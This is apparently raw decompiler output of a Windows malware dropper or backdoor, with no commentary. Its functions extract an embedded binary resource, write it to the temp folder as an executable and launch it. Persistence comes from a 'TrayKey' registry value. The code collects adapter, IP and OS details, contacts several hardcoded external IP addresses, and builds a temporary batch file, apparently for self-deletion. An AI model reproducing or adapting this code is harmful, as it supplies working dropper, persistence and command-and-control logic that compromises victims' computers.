  local_8 = DAT_00422044 ^ (uint)auStack_d0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_28 = 0;
  _memset(local_cc,0,0xa0);
  _memset(param_1,0,0x200);
  iVar3 = FUN_00403980(local_cc);
  if (iVar3 != 0) {
    *param_1 = 0x1000000;
    param_1[1] = (((uint)DAT_00424d0b * 0x100 + (uint)DAT_00424d0a) * 0x100 + (uint)DAT_00424d09) *
                 0x100 + (uint)DAT_00424d08;
    param_1[3] = local_7c;
    param_1[4] = local_82;
    *(undefined2 *)(param_1 + 5) = local_7e;
    psVar5 = local_74;
    param_1[2] = 0x10001af;
    iVar3 = 0x16 - (int)psVar5;
    do {
      sVar1 = *psVar5;
      *(short *)((int)param_1 + iVar3 + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    iVar3 = FUN_00403820();
    pwVar4 = u_UnKmownOS_004230b8 + iVar3 * 10;
    iVar3 = 0x96 - (int)pwVar4;
    do {
      wVar2 = *pwVar4;
      *(wchar_t *)((int)param_1 + iVar3 + (int)pwVar4) = wVar2;
      pwVar4 = pwVar4 + 1;
    } while (wVar2 != L'\0');
    *(uint *)((int)param_1 + 0x196) = DAT_00424e06;
    *(undefined4 *)((int)param_1 + 0x19a) = DAT_00424e0a;
    psVar5 = &DAT_00424e0e;
    do {
      sVar1 = *psVar5;
      *(short *)((int)(param_1 + -0x10931c) + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    FUN_00403720(DAT_00424e06);
  }
  ___security_check_cookie_4(local_8 ^ (uint)auStack_d0);
  return;
}



void FUN_004029b0(void)

{
  WCHAR WVar1;
  short sVar2;
  undefined4 *puVar3;
  short *psVar4;
  short *psVar5;
  HANDLE pvVar6;
  LSTATUS LVar7;
  undefined4 *puVar8;
  int iVar9;
  void *_Memory;
  WCHAR *pWVar10;
  undefined auStack_45c [4];
  HKEY local_458;
  DWORD DStack_454;
  DWORD local_450;
  DWORD local_44c [2];
  WCHAR local_444;
  undefined4 local_442;
  undefined4 local_43e;
  undefined4 local_43a;
  undefined4 local_436;
  undefined4 local_432;
  undefined4 local_42e;
  undefined4 local_42a;
  undefined4 local_426;
  undefined4 local_422;
  undefined2 local_41e;
  WCHAR local_41c;
  undefined local_41a [518];
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)auStack_45c;
  local_41c = L'\0';
  _memset(local_41a,0,0x206);
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_442 = 0;
  local_43e = 0;
  local_43a = 0;
  local_436 = 0;
  local_432 = 0;
  local_42e = 0;
  local_42a = 0;
  local_426 = 0;
  local_422 = 0;
  local_41e = 0;
  local_450 = 0;
  local_44c[0] = 0x104;
  local_444 = L'\0';
  psVar4 = &DAT_004250a0;
  do {
    psVar5 = psVar4;
    psVar4 = psVar5 + 1;
  } while (*psVar5 != 0);
  if (((int)(psVar5 + -0x212850) >> 1 == 0) ||
     (pvVar6 = OpenEventW(0x20000,0,&DAT_004250a0), pvVar6 == (HANDLE)0x0)) {
    LVar7 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041dce8,0,0xf003f,
                          &local_458);
    if (LVar7 == 0) {
      LVar7 = RegQueryValueExW(local_458,u_TrayKey_0041dd64,(LPDWORD)0x0,&local_450,
                               (LPBYTE)&local_444,local_44c);
      if ((LVar7 == 0) && (pvVar6 = OpenEventW(0x20000,0,&local_444), pvVar6 != (HANDLE)0x0)) {
        RegCloseKey(local_458);
        goto LAB_00402c73;
      }
      RegCloseKey(local_458);
    }
    GetTempPathW(0x104,&local_214);
    _wcscat_s(&local_214,0x104,u__gbp_ini_0041dd74);
    FUN_004025d0(&local_214,&DAT_00424e0e,DAT_00424e06,DAT_00424e0a);
    DStack_454 = 0;
    GetTempPathW(0x104,&local_41c);
    puVar3 = &DAT_004250c0;
    do {
      puVar8 = puVar3;
      puVar3 = (undefined4 *)((int)puVar8 + 2);
    } while (*(short *)puVar8 != 0);
    if ((int)(puVar8 + -0x109430) >> 1 == 0) {
      _wcscat_s(&local_41c,0x104,&DAT_0041dd88);
      iVar9 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_0041dd88 + iVar9);
        *(short *)((int)&local_444 + iVar9) = sVar2;
        iVar9 = iVar9 + 2;
      } while (sVar2 != 0);
    }
    else {
      _wcscat_s(&local_41c,0x104,(wchar_t *)&DAT_004250c0);
      iVar9 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_004250c0 + iVar9);
        *(short *)((int)&local_444 + iVar9) = sVar2;
        iVar9 = iVar9 + 2;
      } while (sVar2 != 0);
    }
    _wcscat_s(&local_41c,0x104,u__exe_0041dcb0);
    _Memory = FUN_004031d0(&DStack_454);
    if (_Memory != (void *)0x0) {
      FUN_00402700(&local_41c,_Memory);
      Sleep(1000);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_41c,&DAT_0041ddcc,(LPCWSTR)0x0,1);
      LVar7 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041dce8,0,3,
                            &local_458);
      if (LVar7 == 0) {
        pWVar10 = &local_444;
        do {
          WVar1 = *pWVar10;
          pWVar10 = pWVar10 + 1;
        } while (WVar1 != L'\0');
        LVar7 = RegSetValueExW(local_458,u_TrayKey_0041dd64,0,1,(BYTE *)&local_444,
                               ((int)pWVar10 - (int)&local_442 >> 1) * 2 + 2);
        if (LVar7 == 0) {
          RegCloseKey(local_458);
        }
      }
      _free(_Memory);
    }
  }
LAB_00402c73:
  ___security_check_cookie_4(local_8 ^ (uint)auStack_45c);
  return;
}



void FUN_00402c90(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar4;
  undefined4 uVar5;
  undefined local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&local_18;
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  local_18 = 0;
  iVar1 = FUN_00402d90(s_218_54_31_226_0042364c,in_DL,(uint)DAT_0042365c);
  if (iVar1 != 0) {
    if (DAT_004230b0 == 3) {
      uVar5 = 0x2bac;
    }
    else {
      uVar5 = 0x2ba2;
    }
    iVar2 = FUN_00402d90(s_1_234_83_146_0041ddac,extraout_DL,uVar5);
    if (iVar2 != 0) {
      uVar4 = extraout_DL_00;
      if (DAT_00424e06 != 0) {
        FUN_004037a0(DAT_00424e06);
        uVar4 = extraout_DL_01;
      }
      iVar3 = FUN_00402d90(&local_18,uVar4,(uint)DAT_0042365c);
      if (iVar3 == 0) {
        ___security_check_cookie_4(local_8 ^ (uint)&local_18);
        return;
      }
      if (((iVar1 == 1) && (iVar2 == 1)) && (iVar3 == 1)) {
        FUN_00402d90(s_133_242_129_155_0041ddbc,(char)DAT_0042365c,(uint)DAT_0042365c);
      }
      ___security_check_cookie_4(local_8 ^ (uint)&local_18);
      return;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&local_18);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00402d90(undefined4 param_1,undefined param_2,undefined4 param_3)

{
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  DWORD DVar5;
  int *piVar6;
  int *piVar7;
  wchar_t *_Src;
  short *this;
  int local_434;
  undefined4 local_430;
  undefined local_42c [2];
  byte abStack_42a [3];
  undefined4 local_427;
  undefined4 local_423;
  undefined4 local_41f;
  undefined2 local_41b;
  undefined local_419;
  wchar_t local_418;
  undefined local_416 [518];
  wchar_t local_210;
  undefined local_20e [522];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_434;
  local_430 = param_1;
  local_434 = FUN_0040a310(param_1,param_2,param_3);
  if (local_434 == 0) {
    local_418 = L'\0';
    _memset(local_416,0,0x206);
    local_210 = L'\0';
    _memset(local_20e,0,0x206);
    FUN_00402fe0();
    _wcscat_s(&local_418,0x104,(wchar_t *)&DAT_0041dc40);
    local_42c[0] = 0;
    stack0xfffffbd5 = 0;
    local_427 = 0;
    local_423 = 0;
    local_41f = 0;
    local_41b = 0;
    local_419 = 0;
    _Src = &DAT_00424788;
    do {
      if (*_Src != L'\0') {
        _wcscpy_s(&local_210,0x104,&local_418);
        _wcscat_s(&local_210,0x104,_Src);
        piVar7 = (int *)local_42c;
        iVar2 = FUN_00405540(&local_210);
        if (iVar2 != 0) {
          uVar3 = 0x14;
          piVar6 = (int *)(_Src + 0x82);
          do {
            if (*piVar7 != *piVar6) goto LAB_00402ebf;
            uVar3 = uVar3 - 4;
            piVar6 = piVar6 + 1;
            piVar7 = piVar7 + 1;
          } while (3 < uVar3);
          if (uVar3 == 0) {
LAB_00402f1c:
            iVar4 = 0;
          }
          else {
LAB_00402ebf:
            iVar2 = (uint)*(byte *)piVar7 - (uint)*(byte *)piVar6;
            if (iVar2 == 0) {
              if (uVar3 == 1) goto LAB_00402f1c;
              iVar2 = (uint)*(byte *)((int)piVar7 + 1) - (uint)*(byte *)((int)piVar6 + 1);
              if (iVar2 == 0) {
                if (uVar3 == 2) goto LAB_00402f1c;
                iVar2 = (uint)*(byte *)((int)piVar7 + 2) - (uint)*(byte *)((int)piVar6 + 2);
                if (iVar2 == 0) {
                  if ((uVar3 == 3) ||
                     (iVar2 = (uint)*(byte *)((int)piVar7 + 3) - (uint)*(byte *)((int)piVar6 + 3),
                     iVar2 == 0)) goto LAB_00402f1c;
                }
              }
            }
            iVar4 = 1;
            if (iVar2 < 1) {
              iVar4 = -1;
            }
          }
          if (iVar4 == 0) {
            *_Src = L'\0';
          }
        }
      }
      uVar1 = local_430;
      _Src = _Src + 0x8c;
    } while ((int)_Src < 0x424d00);
    this = &DAT_00424788;
    do {
      if (*this != 0) {
        _DAT_0042477c = *(undefined4 *)(this + 0x80);
        FUN_0040a520(this,uVar1);
      }
      this = this + 0x8c;
    } while ((int)this < 0x424d00);
    _wcscat_s(&local_418,0x104,(wchar_t *)&DAT_004253c8);
    DVar5 = GetFileAttributesW(&local_418);
    if (DVar5 == 0xffffffff) {
      local_434 = 2;
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_434);
  return;
}



void __fastcall FUN_00402fc0(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x104,param_3,&stack0x00000008);
  return;
}



void FUN_00402fe0(void)

{
  wchar_t *pwVar1;
  wchar_t *unaff_ESI;
  WCHAR local_20c [260];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_20c;
  GetModuleFileNameW((HMODULE)0x0,local_20c,0x104);
  pwVar1 = _wcsrchr(local_20c,L'\\');
  *pwVar1 = L'\0';
  _wcscpy_s(unaff_ESI,0x104,local_20c);
  ___security_check_cookie_4(local_4 ^ (uint)local_20c);
  return;
}



ulonglong FUN_00403040(undefined4 param_1)

{
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  ulonglong uVar1;
  
  _rand();
  uVar1 = FUN_00417860(extraout_ECX,extraout_EDX);
  return uVar1;
}



void __cdecl FUN_00403080(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint uVar3;
  int iVar4;
  int iVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  int local_68 [4];
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  undefined4 local_4;
  
  local_68[1] = 0xffffffff;
  local_68[2] = 0xffffffff;
  local_68[3] = 0xffffffff;
  local_54 = 0xffffffff;
  local_50 = 0xffffffff;
  local_4c = 0xffffffff;
  local_44 = 0xffffffff;
  local_40 = 0xffffffff;
  local_3c = 0xffffffff;
  local_38 = 0xffffffff;
  local_34 = 0xffffffff;
  local_2c = 0xffffffff;
  local_28 = 0xffffffff;
  local_24 = 0xffffffff;
  local_20 = 0xffffffff;
  local_1c = 0xffffffff;
  local_14 = 0xffffffff;
  local_10 = 0xffffffff;
  local_c = 0xffffffff;
  local_4 = 0xffffffff;
  local_8 = 1;
  local_18 = 1;
  local_30 = 1;
  local_48 = 1;
  local_58 = 1;
  local_68[0] = 1;
  _rand();
  uVar6 = FUN_00417860(extraout_ECX,extraout_EDX);
  iVar4 = 0;
  iVar5 = 0;
  if (0 < (int)uVar6) {
    do {
      _rand();
      uVar7 = FUN_00417860(extraout_ECX_00,extraout_EDX_00);
      iVar2 = (int)uVar7;
      uVar3 = local_68[iVar2] + iVar4 >> 0x1f;
      iVar1 = (local_68[iVar2] + iVar4 ^ uVar3) - uVar3;
      while (1 < iVar1) {
        iVar2 = iVar2 + 1;
        if (iVar2 == 0x1a) {
          iVar2 = 0;
        }
        uVar3 = local_68[iVar2] + iVar4 >> 0x1f;
        iVar1 = (local_68[iVar2] + iVar4 ^ uVar3) - uVar3;
      }
      iVar4 = iVar4 + local_68[iVar2];
      *(short *)(param_2 + iVar5 * 2) = (short)iVar2 + 0x61;
      iVar5 = iVar5 + 1;
    } while (iVar5 < (int)uVar6);
  }
  return;
}



void * __cdecl FUN_004031d0(DWORD *param_1)

{
  HMODULE hModule;
  HRSRC hResInfo;
  DWORD _Size;
  HGLOBAL hResData;
  LPVOID _Src;
  void *_Dst;
  
  hModule = GetModuleHandleW((LPCWSTR)0x0);
  hResInfo = FindResourceW(hModule,(LPCWSTR)0x83,u_IDR_BINARY_0041dd94);
  if (hResInfo != (HRSRC)0x0) {
    _Size = SizeofResource(hModule,hResInfo);
    hResData = LoadResource(hModule,hResInfo);
    _Src = LockResource(hResData);
    *param_1 = _Size;
    _Dst = operator_new(_Size);
    _memset(_Dst,0,_Size);
    _memcpy(_Dst,_Src,_Size);
    FreeResource(hResData);
    return _Dst;
  }
  return (void *)0x0;
}



LPWSTR __cdecl FUN_00403250(LPCSTR param_1)

{
  char cVar1;
  LPWSTR in_EAX;
  LPCSTR pCVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = 0x20;
  pCVar2 = param_1;
  do {
    cVar1 = *pCVar2;
    pCVar2 = pCVar2 + 1;
  } while (cVar1 != '\0');
  iVar3 = (int)pCVar2 - (int)(param_1 + 1);
  if (in_EAX == (LPWSTR)0x0) {
    iVar4 = MultiByteToWideChar(0,0,param_1,-1,(LPWSTR)0x0,0);
    in_EAX = (LPWSTR)_malloc(iVar4 * 2);
  }
  if (iVar3 == 0) {
    *in_EAX = L'\0';
    return in_EAX;
  }
  if ((0 < iVar4) && (iVar4 + -1 < iVar3)) {
    iVar3 = iVar4 + -1;
  }
  MultiByteToWideChar(0,0,param_1,-1,in_EAX,iVar3 + 1);
  return in_EAX;
}



undefined4 FUN_004032d0(void)

{
  wchar_t wVar1;
  undefined4 *puVar2;
  wchar_t *pwVar3;
  uint uVar4;
  LPCSTR *ppCVar5;
  wchar_t *unaff_EBX;
  int iVar6;
  int local_34 [3];
  wchar_t *local_28 [10];
  
  local_28[0] = (wchar_t *)0x0;
  local_28[1] = (wchar_t *)0x0;
  local_28[2] = (wchar_t *)0x0;
  local_28[3] = (wchar_t *)0x0;
  local_28[4] = (wchar_t *)0x0;
  local_28[5] = (wchar_t *)0x0;
  local_28[6] = (wchar_t *)0x0;
  local_28[7] = (wchar_t *)0x0;
  local_28[8] = (wchar_t *)0x0;
  local_28[9] = (wchar_t *)0x0;
  local_34[0] = 0;
  iVar6 = 0;
  do {
    puVar2 = (undefined4 *)operator_new(0x20);
    *puVar2 = 0;
    puVar2[1] = 0;
    puVar2[2] = 0;
    puVar2[3] = 0;
    puVar2[4] = 0;
    local_28[iVar6] = (wchar_t *)puVar2;
    puVar2[5] = 0;
    iVar6 = iVar6 + 1;
    puVar2[6] = 0;
    puVar2[7] = 0;
  } while (iVar6 < 10);
  pwVar3 = unaff_EBX;
  do {
    wVar1 = *pwVar3;
    pwVar3 = pwVar3 + 1;
  } while (wVar1 != L'\0');
  if (((int)pwVar3 - (int)(unaff_EBX + 1) >> 1 == 0) || (unaff_EBX == (wchar_t *)0x0)) {
    FUN_004033d0(local_34,(undefined4 *)0x0,local_28);
    if (local_34[0] == 0) {
      return 0;
    }
  }
  else {
    _wcscpy_s(local_28[0],0x10,unaff_EBX);
  }
  uVar4 = FUN_00403620(local_28[0]);
  local_34[0] = Ordinal_8(uVar4);
  ppCVar5 = (LPCSTR *)Ordinal_51(local_34,4,2);
  if (ppCVar5 == (LPCSTR *)0x0) {
    return 0;
  }
  FUN_00403250(*ppCVar5);
  return 1;
}



void __fastcall FUN_004033d0(undefined4 param_1,undefined4 *param_2,undefined4 param_3)

{
  char cVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  undefined4 *unaff_EBP;
  int iVar8;
  bool bVar9;
  undefined4 *local_40;
  int *piStack_3c;
  undefined4 *local_38;
  undefined4 local_34;
  undefined4 *local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined2 local_24;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined2 local_16;
  undefined2 uStack_14;
  undefined2 local_12;
  undefined2 uStack_10;
  undefined4 local_e;
  undefined4 local_a;
  undefined2 local_6;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_40;
  local_28 = param_3;
  local_40 = (undefined4 *)0xffffffff;
  local_24 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  uStack_14 = 0;
  local_12 = 0;
  uStack_10 = 0;
  local_e = 0;
  local_a = 0;
  local_6 = 0;
  iVar8 = 0;
  local_30 = param_2;
  local_2c = param_1;
  puVar4 = (undefined4 *)_malloc(0x288);
  local_34 = 0x288;
  local_38 = puVar4;
  iVar5 = GetAdaptersInfo(puVar4,&local_34);
  if (iVar5 == 0x6f) {
    _free(puVar4);
    puVar4 = (undefined4 *)_malloc((size_t)piStack_3c);
    local_40 = puVar4;
  }
  iVar5 = GetAdaptersInfo(puVar4,&piStack_3c);
  puVar3 = puVar4;
  if (iVar5 == 0) {
    for (; puVar3 != (undefined4 *)0x0; puVar3 = (undefined4 *)*puVar3) {
      if (param_2 != (undefined4 *)0x0) {
        *param_2 = puVar3[0x65];
        *(undefined2 *)(param_2 + 1) = *(undefined2 *)(puVar3 + 0x66);
      }
      for (puVar2 = puVar3 + 0x6b; puVar2 != (undefined4 *)0x0; puVar2 = (undefined4 *)*puVar2) {
        puVar4 = puVar2 + 1;
        do {
          cVar1 = *(char *)puVar4;
          puVar4 = (undefined4 *)((int)puVar4 + 1);
        } while (cVar1 != '\0');
        iVar5 = (int)puVar4 - ((int)puVar2 + 5);
        if (0x10 < iVar5) {
          iVar5 = 0x10;
        }
        iVar6 = 0;
        if (-1 < iVar5) {
          bVar9 = iVar5 == 0;
          do {
            if (bVar9) {
              *(undefined2 *)((int)&local_34 + iVar6 * 2) = 0;
            }
            *(short *)((int)&local_34 + iVar6 * 2) = (short)*(char *)((int)(puVar2 + 1) + iVar6);
            iVar6 = iVar6 + 1;
            bVar9 = iVar6 == iVar5;
          } while (iVar6 <= iVar5);
        }
        uVar7 = FUN_00403620(&local_34);
        if (uVar7 != 0) {
          _wcscpy_s((wchar_t *)local_38[iVar8],0x10,(wchar_t *)&local_34);
        }
        iVar8 = iVar8 + 1;
        puVar4 = unaff_EBP;
      }
      if (0 < iVar8) break;
      param_2 = local_40;
    }
  }
  *piStack_3c = iVar8;
  if (puVar4 != (undefined4 *)0x0) {
    _free(puVar4);
  }
  ___security_check_cookie_4(CONCAT22(local_12,uStack_14) ^ (uint)&stack0xffffffb0);
  return;
}



int __cdecl FUN_00403580(int param_1)

{
  wchar_t wVar1;
  wchar_t *in_EAX;
  wchar_t *pwVar2;
  int iVar3;
  size_t _Count;
  
  iVar3 = 0;
  pwVar2 = in_EAX;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  if ((int)pwVar2 - (int)(in_EAX + 1) >> 1 == 0) {
    return 0;
  }
  pwVar2 = _wcsstr(in_EAX,(wchar_t *)&DAT_0041ddd0);
  while (pwVar2 != (wchar_t *)0x0) {
    _Count = (int)pwVar2 - (int)in_EAX >> 1;
    if (0xf < (int)_Count) {
      _Count = 0xf;
    }
    _wcsncpy(*(wchar_t **)(param_1 + iVar3 * 4),in_EAX,_Count);
    in_EAX = pwVar2 + 1;
    *(undefined2 *)(*(int *)(param_1 + iVar3 * 4) + _Count * 2) = 0;
    iVar3 = iVar3 + 1;
    pwVar2 = _wcsstr(in_EAX,(wchar_t *)&DAT_0041ddd0);
  }
  _wcscpy_s(*(wchar_t **)(param_1 + iVar3 * 4),0xf,in_EAX);
  return iVar3 + 1;
}



uint FUN_00403620(undefined4 param_1)

{
  undefined4 *puVar1;
  int iVar2;
  longlong lVar3;
  longlong lVar4;
  longlong lVar5;
  longlong lVar6;
  wchar_t *local_14;
  wchar_t *local_10 [4];
  
  local_10[0] = (wchar_t *)0x0;
  local_10[1] = (wchar_t *)0x0;
  local_10[2] = (wchar_t *)0x0;
  local_10[3] = (wchar_t *)0x0;
  iVar2 = 0;
  do {
    puVar1 = (undefined4 *)operator_new(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    local_10[iVar2] = (wchar_t *)puVar1;
    puVar1[5] = 0;
    iVar2 = iVar2 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar2 < 4);
  iVar2 = FUN_00403580((int)local_10);
  if (iVar2 != 4) {
    return 0;
  }
  lVar3 = __wcstoi64(local_10[0],&local_14,10);
  lVar4 = __wcstoi64(local_10[1],&local_14,10);
  lVar5 = __wcstoi64(local_10[2],&local_14,10);
  lVar6 = __wcstoi64(local_10[3],&local_14,10);
  iVar2 = 0;
  do {
    if (local_10[iVar2] != (wchar_t *)0x0) {
      _free(local_10[iVar2]);
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 4);
  return (uint)lVar6 | (((int)lVar3 << 8 | (uint)lVar4) << 8 | (uint)lVar5) << 8;
}



void __fastcall FUN_00403720(uint param_1)

{
  wchar_t *unaff_ESI;
  wchar_t local_24;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined4 local_a;
  undefined2 local_6;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_24;
  local_24 = L'\0';
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_6 = 0;
  FUN_00403ba0(param_1 >> 0x18,&local_24,u__d__d__d__d_0041ddd4);
  _wcscpy_s(unaff_ESI,0x10,&local_24);
  ___security_check_cookie_4(local_4 ^ (uint)&local_24);
  return;
}



void __cdecl FUN_004037a0(uint param_1)

{
  char *unaff_ESI;
  char local_14;
  undefined4 local_13;
  undefined4 local_f;
  undefined4 local_b;
  undefined2 local_7;
  undefined local_5;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_14;
  local_14 = '\0';
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_7 = 0;
  local_5 = 0;
  FUN_00403bc0(param_1 >> 0x10 & 0xff,&local_14,s__d__d__d__d_0041ddec);
  _strcpy_s(unaff_ESI,0x10,&local_14);
  ___security_check_cookie_4(local_4 ^ (uint)&local_14);
  return;
}



void FUN_00403820(void)

{
  BOOL BVar1;
  _OSVERSIONINFOW local_120;
  ushort uStack_c;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_120;
  _memset(&local_120.dwMajorVersion,0,0x118);
  local_120.dwOSVersionInfoSize = 0x11c;
  BVar1 = GetVersionExW(&local_120);
  if (BVar1 != 0) {
    if (local_120.dwMajorVersion == 5) {
      if (local_120.dwMinorVersion == 0) {
        if (3 < uStack_c) {
          ___security_check_cookie_4(local_4 ^ (uint)&local_120);
          return;
        }
      }
      else if ((1 < local_120.dwMinorVersion) || (local_120.dwMinorVersion == 1)) {
        ___security_check_cookie_4(local_4 ^ (uint)&local_120);
        return;
      }
    }
    else if ((local_120.dwMajorVersion == 6) && (local_120.dwMinorVersion == 0)) {
      ___security_check_cookie_4(local_4 ^ (uint)&local_120);
      return;
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_120);
  return;
}



undefined8 FUN_00403920(void)

{
  LPCWSTR in_EAX;
  HANDLE hFile;
  BOOL BVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  LARGE_INTEGER LStack_c;
  
  hFile = CreateFileW(in_EAX,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    return 0xffffffffffffffff;
  }
  BVar1 = GetFileSizeEx(hFile,&LStack_c);
  uVar2 = -1;
  uVar3 = 0xffffffff;
  if (BVar1 == 1) {
    uVar2 = LStack_c.s.HighPart;
    uVar3 = LStack_c.s.LowPart;
  }
  CloseHandle(hFile);
  return CONCAT44(uVar2,uVar3);
}



void __fastcall FUN_00403980(void *param_1)

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  int local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_48;
  local_44 = 0;
  local_40 = 0;
  local_3c = 0;
  local_38 = 0;
  local_34 = 0;
  local_30 = 0;
  local_2c = 0;
  local_28 = 0;
  local_24 = 0;
  local_20 = 0;
  local_48 = 0;
  _memset(param_1,0,0xa0);
  iVar3 = 0;
  do {
    puVar1 = (undefined4 *)operator_new(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    (&local_44)[iVar3] = puVar1;
    puVar1[5] = 0;
    iVar3 = iVar3 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar3 < 10);
  FUN_004033d0(&local_48,(undefined4 *)((int)param_1 + 0x4a),&local_44);
  if (0 < local_48) {
    uVar2 = FUN_00403620(local_44);
    *(uint *)((int)param_1 + 0x50) = uVar2;
    local_44 = local_44 & 0xffff0000;
    _memset((void *)((int)&local_44 + 2),0,0x3e);
    iVar3 = FUN_004032d0();
    if (iVar3 == 1) {
      _wcscpy_s((wchar_t *)((int)param_1 + 0x58),0x21,(wchar_t *)&local_44);
      ___security_check_cookie_4(local_4 ^ (uint)&local_48);
      return;
    }
    ___security_check_cookie_4(local_4 ^ (uint)&local_48);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_48);
  return;
}



void FUN_00403ab0(void)

{
  LPWSTR unaff_EDI;
  wchar_t local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_20c;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  if (DAT_004230b0 == 3) {
    GetSystemDirectoryW(&local_20c,0x104);
    _wcscat_s(&local_20c,0x104,(wchar_t *)&DAT_0041dc40);
  }
  else {
    GetTempPathW(0x104,&local_20c);
  }
  wsprintfW(unaff_EDI,u__s_s_exe_0041dc44,&local_20c);
  ___security_check_cookie_4(local_4 ^ (uint)&local_20c);
  return;
}



void FUN_00403b50(void)

{
  size_t in_EAX;
  DWORD DVar1;
  int iVar2;
  void *unaff_EBX;
  int iVar3;
  int iVar4;
  
  _memset(unaff_EBX,0,in_EAX);
  iVar4 = (int)(in_EAX + ((int)in_EAX >> 0x1f & 3U)) >> 2;
  DVar1 = GetTickCount();
  FUN_0040ad1b(DVar1);
  iVar3 = 0;
  if (0 < iVar4) {
    do {
      iVar2 = _rand();
      *(int *)((int)unaff_EBX + iVar3 * 4) = iVar2;
      iVar3 = iVar3 + 1;
    } while (iVar3 < iVar4);
  }
  return;
}



void __fastcall FUN_00403ba0(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



void __fastcall FUN_00403bc0(undefined4 param_1,char *param_2,char *param_3)

{
  _vsprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



void FUN_00403be0(void)

{
  char cVar1;
  char *pcVar2;
  HANDLE hFile;
  char *pcVar3;
  char *pcVar4;
  DWORD local_314;
  CHAR local_310 [260];
  CHAR aCStack_20c [260];
  char acStack_108 [260];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_314;
  local_314 = 0;
  GetTempPathA(0x104,local_310);
  _strcat_s(local_310,0x104,s__vslite_bat_0041ddfc);
  GetModuleFileNameA((HMODULE)0x0,aCStack_20c,0x104);
  _strcpy_s(acStack_108,0x104,aCStack_20c);
  pcVar2 = _strrchr(acStack_108,0x5c);
